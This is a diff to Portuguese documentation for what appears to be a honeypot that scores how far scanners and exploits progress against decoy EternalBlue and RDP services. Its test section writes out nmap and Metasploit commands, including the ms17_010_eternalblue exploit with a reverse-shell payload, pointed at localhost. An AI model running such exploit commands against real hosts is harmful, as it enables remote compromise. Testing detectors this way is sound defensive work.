@@ -101,7 +101,7 @@ O sinal comportamental que distingue reconhecimento automatizado de tráfego leg
 |-------|------|--------------|
 | B1-B3 | (compartilhadas com MS12-020) | X.224 Connection Request (cookie, protocolos suportados), Security Negotiation (ausência de NLA), MCS Connect Initial (hostname, resolução, teclado, timezone) |
 | B4 | Channel Join | Canais virtuais solicitados |
-| B5 | Exploit PDU | Dados no canal virtual MS_T120 (sonda do scanner ou payload), depois da sequência de conexão completa; o decoy responde MCS Disconnect Provider Ultimatum, como um alvo vulnerável |
+| B5 | MS_T120 Probe | Dados no canal virtual MS_T120 (sonda do scanner ou payload), depois da sequência de conexão completa; o decoy responde MCS Disconnect Provider Ultimatum, como um alvo vulnerável |
 
 ### Etapas do MS12-020 (RDP)
 
@@ -173,23 +173,23 @@ sudo systemctl stop xrdp        # libera porta 3389 (xrdp)
 ### Testar EternalBlue
 
 ```bash
-# Scanner nmap (SC = 4/5 — para após confirmar "VULNERABLE")
+# Scanner nmap (SC = 5/5 — para após o veredito)
 nmap --script smb-vuln-ms17-010 -p 445 127.0.0.1
 
-# Scanner Metasploit (SC = 4/5 — mesmo comportamento)
+# Scanner Metasploit (SC = 5/5 — continua depois do veredito: "atividade além de N")
 msfconsole -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 127.0.0.1; run'
 
-# Exploit Metasploit (SC = 5/5 — envia payload TRANSACTION2 malformado)
+# Exploit Metasploit (SC = 5/5 — continua depois do veredito: "atividade além de N")
 msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 127.0.0.1; set PAYLOAD generic/shell_reverse_tcp; set LHOST 127.0.0.1; run'
 ```
 
 | Ferramenta | SC | Comportamento |
 |---|---|---|
-| `nmap smb-vuln-ms17-010` | 4/5 = 80% | Scanner: para após confirmar "VULNERABLE" em E4 |
-| `metasploit smb_ms17_010` (auxiliary) | 4/5 = 80% | Scanner: mesmo comportamento do nmap |
-| `metasploit ms17_010_eternalblue` (exploit) | 5/5 = 100% | Exploiter: envia pacotes TRANSACTION2 malformados |
+| `nmap smb-vuln-ms17-010` | 5/5 = 100% | Para após a resposta do PeekNamedPipe (o veredito) |
+| `metasploit smb_ms17_010` (auxiliary) | 5/5 = 100% | Continua com transações depois do veredito (atividade além de N) |
+| `metasploit ms17_010_eternalblue` (exploit) | 5/5 = 100% | Idem |
 
-> **Nota:** a distinção 4/5 vs 5/5 permite diferenciar scanners de reconhecimento (que param após confirmar a vulnerabilidade) de ferramentas de exploração real.
+> **Nota:** a stage N é a troca da qual o scanner tira o veredito (aqui, a resposta STATUS_INSUFF_SERVER_RESOURCES ao PeekNamedPipe), então o SC é limitado a ela. O que a ferramenta faz depois não conta para o SC; fica registrado em `activity_beyond_n` no JSON da sessão, e é isso que diferencia uma ferramenta que para no veredito de uma que segue adiante.
 
 ### Testar BlueKeep
 
